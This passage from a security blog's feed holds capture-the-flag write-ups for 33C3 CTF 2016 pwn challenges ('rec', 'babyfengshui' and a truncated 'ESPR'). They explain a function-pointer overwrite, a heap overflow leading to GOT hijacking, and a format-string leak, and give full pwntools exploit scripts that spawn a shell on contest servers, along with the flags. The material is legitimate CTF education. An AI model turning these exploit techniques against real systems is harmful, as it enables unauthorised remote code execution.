class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ ./rec </span><br><span class="line">Calculators are fun!</span><br><span class="line">0 - Take note</span><br><span class="line">1 - Read note</span><br><span class="line">2 - Polish</span><br><span class="line">3 - Infix</span><br><span class="line">4 - Reverse Polish</span><br><span class="line">5 - Sign</span><br><span class="line">6 - Exit</span><br><span class="line">&gt; 5</span><br><span class="line">0</span><br><span class="line">[1]    40091 segmentation fault (core dumped)  ./rec</span><br></pre></td></tr></table></figure></p><p>The reason why the program crash is because the program did not assigned a value to <code>v1</code> (since it did not handle <code>0</code>), so when it ran to line <code>v1()</code>, it will set the EIP to <code>0x0</code> and crash the program. Let’s check the assembly code:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x56555d3b:  mov    eax,DWORD PTR [ebp-0x20]   &lt;-- &amp;v1 = ebp-0x20</span><br><span class="line">0x56555d3e:  call   eax</span><br></pre></td></tr></table></figure></p><p>It shows that if we can control the value of <code>[ebp-0x20]</code>, we’ll be able to control the EIP and hijack the program control flow.</p><p>I found that the stack frame of the <code>sign</code> function is “higher” (or “lesser”) than the other functions. If we can’t “reach that high” in other functions, we won’t be able to control the function pointer. </p><p>After done some fuzzing, I finally found that in the <code>Polish</code> function, if we do the <code>sum</code> operation and keep entering number, the program will keep pushing number to the stack, making us able to “reach the height” and control the function pointer (and the parameters !) in the <code>sign</code> function.</p><p>So here’s how we gonna exploit the service:</p><ol><li>Take a note &amp; Read the note, leak the text’s base address</li><li>Use <code>Polish</code>‘s <code>sum</code> operation to control the function pointer &amp; the function parameter. We first set the function pointer to <code>puts</code> and the parameter to <code>__libc_start_main@got</code> (there’s no <code>.got.plt</code> due to the <strong>FULL RELRO</strong> protection)</li><li>Goto <code>sign</code> function and input <code>0</code>, it will call <code>puts(__libc_start_main@got)</code> and gave us the libc’s base address</li><li>Repeat step 2, this time we set the function pointer to <code>system</code> and the parameter to “pointer to /bin/sh”</li><li>Goto <code>sign</code> function and input <code>0</code>, call <code>system(&quot;/bin/sh&quot;)</code> and get the shell</li></ol><p>Here’s the exploit. The libc’s information are provided by <a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">libc-database</a><br><figure class="highlight python"><figcaption><span>exp_rec.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"78.46.224.74"</span></span><br><span class="line">PORT = <span class="number">4127</span></span><br><span class="line">ELF_PATH = <span class="string">"./rec"</span></span><br><span class="line">LIBC_PATH = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.endian = <span class="string">'little'</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line"><span class="comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.log_level = <span class="string">'INFO'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">take_note</span><span class="params">(note)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"0"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"note: "</span>, note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_note</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">polish_sum</span><span class="params">(nums)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Operator:"</span>, <span class="string">"S"</span>)</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"adding:"</span>, num</span><br><span class="line">        r.sendlineafter(<span class="string">"Operand:"</span>, str(num))</span><br><span class="line"></span><br><span class="line">    r.sendlineafter(<span class="string">"Operand:"</span>, <span class="string">"."</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(num)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"5"</span>)</span><br><span class="line">    r.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line">    </span><br><span class="line">    take_note(<span class="string">"123"</span>)</span><br><span class="line">    read_note()</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">"note: "</span>)</span><br><span class="line">    fptr_addr = u32(r.recv(<span class="number">4</span>)) - <span class="number">0x350</span> <span class="comment"># where the function pointer be loaded</span></span><br><span class="line">    text_base = u32(r.recv(<span class="number">4</span>)) - <span class="number">0x6fb</span></span><br><span class="line">    puts = text_base + <span class="number">0x520</span></span><br><span class="line">    lsm_got = text_base + <span class="number">0x2fe0</span></span><br><span class="line">    puts_got = text_base + <span class="number">0x2fd8</span></span><br><span class="line">    </span><br><span class="line">    log.success(<span class="string">"fptr_addr: "</span>+hex(fptr_addr))</span><br><span class="line">    log.success(<span class="string">"text_base: "</span>+hex(text_base))</span><br><span class="line"></span><br><span class="line">    nums = [i <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0x63</span>)] + [puts, lsm_got]</span><br><span class="line">    polish_sum(nums)</span><br><span class="line"></span><br><span class="line">    sign(<span class="number">0</span>) <span class="comment"># this will call puts(lsm_got)</span></span><br><span class="line">    lsm_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="comment">#########################################</span></span><br><span class="line">    <span class="comment">#$ ./dump libc6-i386_2.24-3ubuntu2_amd64</span></span><br><span class="line">    <span class="comment">#offset___libc_start_main = 0x00018180</span></span><br><span class="line">    <span class="comment">#offset_system = 0x0003a8b0</span></span><br><span class="line">    <span class="comment">#offset_str_bin_sh = 0x15cbcf</span></span><br><span class="line">    <span class="comment">#########################################</span></span><br><span class="line">    system_addr = lsm_addr + <span class="number">0x22730</span> </span><br><span class="line">    bin_sh = lsm_addr + <span class="number">0x144a4f</span> </span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">"lsm: "</span>+hex(lsm_addr))</span><br><span class="line">    log.success(<span class="string">"system: "</span>+hex(system_addr))</span><br><span class="line">    log.success(<span class="string">"bin_sh: "</span>+hex(bin_sh))</span><br><span class="line"></span><br><span class="line">    nums = [i <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0x63</span>)] + [numpy.int32(system_addr), numpy.int32(bin_sh)]</span><br><span class="line">    polish_sum(nums)</span><br><span class="line">    sign(<span class="number">0</span>) <span class="comment"># this time will call system("/bin/sh")</span></span><br><span class="line">    </span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure></p><p>The flag is in <code>/challenge/flag.txt</code></p><p>flag: <code>33C3_L0rd_Nikon_would_l3t_u_1n</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; pwn&lt;br&gt;&lt;strong&gt;Points:&lt;/strong&gt; 200&lt;/p&gt;
    
    </summary>
    
      <category term="write-ups" scheme="https://bruce30262.github.io/categories/write-ups/"/>
    
    
      <category term="CTF" scheme="https://bruce30262.github.io/tags/CTF/"/>
    
      <category term="Pwnable" scheme="https://bruce30262.github.io/tags/Pwnable/"/>
    
      <category term="Python" scheme="https://bruce30262.github.io/tags/Python/"/>
    
      <category term="33C3" scheme="https://bruce30262.github.io/tags/33C3/"/>
    
  </entry>
  
  <entry>
    <title>33C3 CTF 2016 -- babyfengshui</title>
    <link href="https://bruce30262.github.io/2016/12/30/2016-12-30-33c3-ctf-2016-babyfengshui/"/>
    <id>https://bruce30262.github.io/2016/12/30/2016-12-30-33c3-ctf-2016-babyfengshui/</id>
    <published>2016-12-29T16:27:00.000Z</published>
    <updated>2018-01-03T15:08:05.599Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Category:</strong> pwn<br><strong>Points:</strong> 150</p><a id="more"></a>  <p>32 bit ELF, with Partial RELRO, canary &amp; NX enabled, No PIE  </p><p>program menu:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./babyfengshui</span><br><span class="line">0: Add a user</span><br><span class="line">1: Delete a user</span><br><span class="line">2: Display a user</span><br><span class="line">3: Update a user description</span><br><span class="line">4: Exit</span><br></pre></td></tr></table></figure></p><p>Add a user:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Action: 0</span><br><span class="line">size of description: 50 &lt;-- max length of description</span><br><span class="line">name: AAAA </span><br><span class="line">text length: 12 &lt;-- actual length of description</span><br><span class="line">text: 1234</span><br></pre></td></tr></table></figure></p><p>Show a user:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Action: 2</span><br><span class="line">index: 0 &lt;-- user&apos;s index</span><br><span class="line">name: AAAA</span><br><span class="line">description: 1234</span><br></pre></td></tr></table></figure></p><p>Update a user:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Action: 3</span><br><span class="line">index: 0</span><br><span class="line">text length: 10 &lt;-- new length of the description</span><br><span class="line">text: 1234567890</span><br></pre></td></tr></table></figure></p><p>Here’s the data structure of a user:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span>* desc;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">124</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>The program will free <code>user-&gt;desc</code> &amp; <code>user</code> while deleting a user. It also clear the pointer of the <code>user</code>, so there’s no Use-After-Free vulnerability. </p><p>The program has some strange protection while setting the user’s description:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// users = struct user *users[]</span></span><br><span class="line"><span class="keyword">if</span> ( &amp;users[id]-&gt;desc[text_len] &gt;= &amp;users[id] - <span class="number">4</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"my l33t defenses cannot be fooled, cya!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"text: "</span>);</span><br><span class="line">read_n(users[id]-&gt;desc, text_len + <span class="number">1</span>);</span><br></pre></td></tr></table></figure></p><p>So <code>user-&gt;desc + text_len</code> must &lt; <code>user</code> (both <code>user-&gt;desc</code> and <code>user</code> are pointers). Guess it use this protection to avoid heap overflow.</p><p>But what if we have the following heap memory layout?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">            +-----------------------+</span><br><span class="line">userD-&gt;desc |                       |</span><br><span class="line">            |                       |</span><br><span class="line">            +-----------------------+</span><br><span class="line">            |            userB-&gt;desc| userB</span><br><span class="line">            |                       |</span><br><span class="line">            |                       |</span><br><span class="line">            |                       |</span><br><span class="line">            +-----------------------+</span><br><span class="line">            |            userC-&gt;desc| userC</span><br><span class="line">            |                       |</span><br><span class="line">            |                       |</span><br><span class="line">            |                       |</span><br><span class="line">            +-----------------------+</span><br><span class="line">            |            userD-&gt;desc| userD</span><br><span class="line">            |                       |</span><br><span class="line">            |                       |</span><br><span class="line">            |                       |</span><br><span class="line">            +-----------------------+</span><br></pre></td></tr></table></figure></p><p>According to the protection, <code>userD-&gt;desc + text_len</code> should less than <code>userD</code>, <strong>which means it will be ok to overwrite the whole <code>userB</code> and <code>userC</code></strong>.</p><p>It is possible to arrange the above heap memory layout if we’re familiar with malloc’s memory allocation. We can then exploit the heap overflow vulnerability and modify the <code>userB-&gt;desc</code> pointer, making us able to do the <strong>read/write anywhere</strong> attack. After that is pretty simple, we leak the libc’s base address and hijack <code>free</code>‘s GOT to get the shell.</p><figure class="highlight python"><figcaption><span>exp_baby.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"78.46.224.83"</span></span><br><span class="line">PORT = <span class="number">1456</span></span><br><span class="line">ELF_PATH = <span class="string">"./babyfengshui_noalarm"</span></span><br><span class="line">LIBC_PATH = <span class="string">"./libc-2.19.so"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.endian = <span class="string">'little'</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line"><span class="comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.log_level = <span class="string">'INFO'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line">libc = ELF(LIBC_PATH)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_user</span><span class="params">(desc_len, name, text_len, text)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Action: "</span>, <span class="string">"0"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"description: "</span>, str(desc_len))</span><br><span class="line">    r.sendlineafter(<span class="string">"name: "</span>, name)</span><br><span class="line">    r.sendlineafter(<span class="string">"length: "</span>, str(text_len))</span><br><span class="line">    r.sendlineafter(<span class="string">"text: "</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_user</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Action: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_user</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Action: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_user</span><span class="params">(index, text_len, text)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Action: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line">    r.sendlineafter(<span class="string">"length: "</span>, str(text_len))</span><br><span class="line">    r.sendlineafter(<span class="string">"text: "</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line">    </span><br><span class="line">    add_user(<span class="number">50</span>, <span class="string">"A"</span>*<span class="number">123</span>, <span class="number">12</span>, <span class="string">"a"</span>*<span class="number">12</span>)</span><br><span class="line">    add_user(<span class="number">50</span>, <span class="string">"B"</span>*<span class="number">123</span>, <span class="number">12</span>, <span class="string">"b"</span>*<span class="number">12</span>) </span><br><span class="line">    add_user(<span class="number">50</span>, <span class="string">"C"</span>*<span class="number">123</span>, <span class="number">12</span>, <span class="string">"sh\x00"</span>) <span class="comment"># user[2], desc = "sh\x00" (for later's GOT hijacking)</span></span><br><span class="line">    del_user(<span class="number">0</span>)</span><br><span class="line">    add_user(<span class="number">90</span>, <span class="string">"D"</span>*<span class="number">123</span>, <span class="number">12</span>, <span class="string">"d"</span>*<span class="number">12</span>)</span><br><span class="line">    add_user(<span class="number">50</span>, <span class="string">"E"</span>*<span class="number">123</span>, <span class="number">0x100</span>, <span class="string">"i"</span>*<span class="number">0xf8</span> + p32(elf.got[<span class="string">'__libc_start_main'</span>])) </span><br><span class="line">    <span class="comment"># now user[4]'s desc is user[0]'s desc (in previous)</span></span><br><span class="line">    <span class="comment"># user[4]-&gt;desc + 0x2c8 = user[4], which means we can overflow user[4]-&gt;desc &amp; overwrite user[1]-&gt;desc to libc_start_main@got.plt</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak address</span></span><br><span class="line">    show_user(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"description: "</span>)</span><br><span class="line">    libc.address += u32(r.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    system_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    log.success(<span class="string">"libc: "</span>+hex(libc.address))</span><br><span class="line">    log.success(<span class="string">"system: "</span>+hex(system_addr))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># change user[1]-&gt;desc into free@got.plt</span></span><br><span class="line">    <span class="comment"># hijack free's got, then free user[2] to get shell</span></span><br><span class="line">    update_user(<span class="number">4</span>, <span class="number">0x100</span>, <span class="string">"i"</span>*<span class="number">0xf8</span> + p32(elf.got[<span class="string">'free'</span>]))</span><br><span class="line">    update_user(<span class="number">1</span>, <span class="number">5</span>, p32(system_addr))</span><br><span class="line">    del_user(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure><p>flag: <code>33C3_h34p_3xp3rts_c4n_gr00m_4nd_f3ng_shu1</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; pwn&lt;br&gt;&lt;strong&gt;Points:&lt;/strong&gt; 150&lt;/p&gt;
    
    </summary>
    
      <category term="write-ups" scheme="https://bruce30262.github.io/categories/write-ups/"/>
    
    
      <category term="CTF" scheme="https://bruce30262.github.io/tags/CTF/"/>
    
      <category term="Pwnable" scheme="https://bruce30262.github.io/tags/Pwnable/"/>
    
      <category term="Python" scheme="https://bruce30262.github.io/tags/Python/"/>
    
      <category term="heap" scheme="https://bruce30262.github.io/tags/heap/"/>
    
      <category term="heap_overflow" scheme="https://bruce30262.github.io/tags/heap-overflow/"/>
    
      <category term="33C3" scheme="https://bruce30262.github.io/tags/33C3/"/>
    
  </entry>
  
  <entry>
    <title>33C3 CTF 2016 -- ESPR</title>
    <link href="https://bruce30262.github.io/2016/12/29/2016-12-29-33c3-ctf-2016-espr/"/>
    <id>https://bruce30262.github.io/2016/12/29/2016-12-29-33c3-ctf-2016-espr/</id>
    <published>2016-12-29T14:52:00.000Z</published>
    <updated>2018-01-03T15:08:05.599Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Category:</strong> pwn<br><strong>Points:</strong> 150</p><a id="more"></a>  <p>This time there’s no binary or libc.so provided, only an image looks like this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">eat:                  sleep:</span><br><span class="line">+-----------------+   +----------------+</span><br><span class="line">| sub rsp, 0x100  |   | mov edi, 0x1   |</span><br><span class="line">| mov rdi, rsp    |   | call _sleep    |</span><br><span class="line">| call _gets      |   |                |</span><br><span class="line">|                 |   |                |</span><br><span class="line">+-----------------+   +----------------+</span><br><span class="line">pwn:                  repeat:</span><br><span class="line">+-----------------+   +----------------+</span><br><span class="line">| mov rdi, rsp    |   |                |</span><br><span class="line">| call _printf    |   | jmp eat        |</span><br><span class="line">| add rsp, 0x100  |   |                |</span><br><span class="line">|                 |   |                |</span><br><span class="line">+-----------------+   +----------------+</span><br></pre></td></tr></table></figure></p><p>Interesting…</p><p>So apparently the program has two vulnerabilities: <strong>stack overflow</strong> &amp; <strong>format string</strong>. Since we can’t actually exploit the stack overflow vulnerability (the program likely won’t return because of the infinite loop), we’ll have to focus on the format string vulnerability and exploit the service without having the binary file.</p><p>So how are we gonna do this? Fortunately, <a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">pwntools</a> is here to rescue! <strong>By using the amazing <a href="http://docs.pwntools.com/en/stable/dynelf.html" target="_blank" rel="noopener">DynELF</a> module, we’re able to resolve &amp; leak some address without the need for binary!</strong> </p><p>First we’ll need a <code>leak</code> function to let pwntools able to leak data at an arbitrary address. Here we exploit the format string vulnerability to leak an arbitrary address:<br><figure class="highlight python"><figcaption><span>leak</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">"%7$s.AAA"</span>+p64(addr)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"leaking:"</span>, hex(addr)</span><br><span class="line">    resp = r.recvuntil(<span class="string">".AAA"</span>)</span><br><span class="line">    ret = resp[:<span class="number">-4</span>:] + <span class="string">"\x00"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"ret:"</span>, repr(ret)</span><br><span class="line">    r.recvrepeat(<span class="number">0.2</span>) <span class="comment"># receive the rest of the string</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure></p><p>Then we need a pointer into the binary. I got the pointer by entering <code>%30$p</code>, which returned <code>0x40060d</code>. Now we can use the <code>DynELF</code> module to help us resolve some function addresses.</p><p>First we’ll need to resolve the address of <code>printf</code> and <code>system</code>:<br><figure class="highlight python"><figcaption><span>leak library addresses</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">d = DynELF(leak, <span class="number">0x40060d</span>)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line">printf_addr = d.lookup(<span class="string">'printf'</span>, <span class="string">'libc'</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"printf_addr: "</span>+hex(printf_addr))</span><br><span class="line">log.success(<span class="string">"system_addr: "</span>+hex(system_addr))</span><br></pre></td></tr></table></figure></p><p>It took a while because of <code>sleep(1)</code>, and pwntools will need a lot of addresses to resolve those functions.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] printf_addr: 0x7fb040a17550</span><br><span class="line">[+] system_addr: 0x7fb040a066d0</span><br></pre></td></tr></table></figure></p><p>OK so now we know the offset between <code>printf</code> and <code>system</code>. Next time we’ll just have to leak <code>printf@got.plt</code>, calculate <code>system</code>‘s address and use it to overwrite <code>printf</code>‘s GOT entry, finally we’ll be able to hijack <code>printf</code>‘s GOT and call <code>system(&quot;sh&quot;)</code> by entering “sh”.</p><p>But first we’ll have to know the address of <code>printf@got.plt</code>. Luckily, not only can <code>DynELF</code> resolve function addresses, it can also resolve some useful addresses such as the pointer to the <code>.dynamic</code> section:<br><figure class="highlight python"><figcaption><span>resolve .dynamic section</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d = DynELF(leak, <span class="number">0x40060d</span>)</span><br><span class="line">dynamic_ptr = d.dynamic</span><br></pre></td></tr></table></figure></p><p>Once we got the <code>.dynamic</code> section’s address, we can use it to 